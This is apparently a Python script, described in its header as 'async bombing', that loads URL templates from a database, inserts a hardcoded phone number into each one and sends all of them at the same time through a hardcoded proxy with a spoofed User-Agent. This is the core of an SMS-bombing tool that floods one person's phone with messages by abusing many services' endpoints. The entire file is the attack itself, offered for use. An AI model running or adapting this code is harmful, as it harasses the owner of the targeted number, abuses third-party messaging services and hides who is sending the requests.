#!/usr/bin/python python3
# coding=utf-8
'''
Author: whalefall
Date: 2021-08-07 21:23:35
LastEditTime: 2021-08-30 11:54:39
Description: 异步轰炸
'''
import httpx
import asyncio
from utils.db_sqlite import Sql

header = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.9 Safari/537.36",
}


async def get(url, session: httpx.AsyncClient):
    '''异步请求'''
    print(f"开始请求{url}")
    try:
        # resp = session.get(url, headers=header)
        status = await session.get(url, headers=header)
        print(status.text)
    except Exception as e:
        print(f'请求失败{url}.{e}')

async def main():
    urls = Sql().select()
    tasks = []
    async with httpx.AsyncClient(timeout=8,proxies={"all://":"http://120.52.73.44:18080"}) as session:
        for url in urls:
            url = url.replace("{phone}", "19820294268")
            task = asyncio.create_task(get(url, session))
            tasks.append(task)
        await asyncio.wait(tasks)

if __name__ == "__main__":
    asyncio.run(main())
